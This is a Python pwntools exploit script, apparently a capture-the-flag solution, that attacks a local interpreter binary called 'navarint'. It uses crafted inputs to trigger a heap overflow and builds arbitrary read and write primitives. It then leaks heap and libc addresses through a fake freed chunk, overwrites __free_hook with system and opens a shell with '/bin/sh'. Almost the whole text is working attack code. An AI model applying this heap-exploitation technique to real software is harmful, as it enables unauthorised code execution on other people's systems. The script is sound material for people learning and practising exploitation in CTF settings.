from pwn import *

show_eval = False
def do_eval(stmt):
    if show_eval:
        print(stmt)
    p.sendlineafter(']:', stmt)
    if 'Out' in p.recvuntil(('Out', 'In')):
        p.recvuntil(']: ')
        ret = p.recvline()
    else:
        ret = None
    return ret

p = process('navarint/bin/navarint')
#p = process('./interp')

# Do a heap overflow
do_eval('0xdeadbeef')
do_eval('printf = "fake"')
do_eval('3' + '*'*62 + '0x21')
do_eval('printf = "fake2"')
do_eval('1*1' + '*'*60 + '0xdeadbeef')
do_eval('hah = "asdf"')
do_eval('haha = "asddf"')

prim_sym = 'printf'
def read_u64_off(addr_off):
    val = 0
    for i in range(8):
        x = int(do_eval('%s[%d]' % (prim_sym, i + addr_off))) & 0xff
        val |= x << (i * 8)
    return val

def write_u64_off(addr_off, val):
    for i in range(8):
        x = (val >> (i * 8)) & 0xff
        do_eval('%s[%d] = %d' % (prim_sym, i + addr_off, x))

str_base = read_u64_off(0x48) - 0x18
heap_base = str_base - 0x2048

log.info('String base is: 0x%016x', str_base)
log.info('Heap base is:   0x%016x', heap_base)

# Write a big size for our new primitive read/write
str_off = 0x20
write_u64_off(0x100, heap_base + 0x8)
for i in range(7):
    do_eval('haha[%d] = 0xff' % (i + 8)) 
write_u64_off(0x100, heap_base + 0x18)
str_base = heap_base + str_off
prim_sym = 'haha'

def read_u64_heap(off):
    return read_u64_off(off - str_off)
def write_u64_heap(off, val):
    return write_u64_off(off - str_off, val)

# Now get libc leaks by freeing large fake chunk
victim = 0x13e8
log.info('Making large chunk at: 0x%016x', heap_base + victim + 8)
write_u64_heap(victim + 0x1010, 0x21)
write_u64_heap(victim + 0x1030, 0x21)

write_u64_heap(victim, 0x1011)

pointer = 0x1800
libc_base = read_u64_heap(pointer) - 0x3ebca0
log.success('Libc base: 0x%016x', libc_base)

# Make sure malloc does not corrupt data below this fake heap
write_u64_heap(pointer - 8, 0x21) 

# Create new "write64-once" function
def write_u64_heap(off, val):
    off = off - str_off
    do_eval("i = 0")
    do_eval("val = %d" % val)
    do_eval("while(i<8) {haha[i+%d] = val; val = val >> 8; i=i+1}" % off)

# Write free_hook
libc_elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
write_u64_heap(libc_base - heap_base + libc_elf.symbols['__free_hook'],
        libc_base + libc_elf.symbols.system)

p.sendline("/bin/sh")
p.interactive()
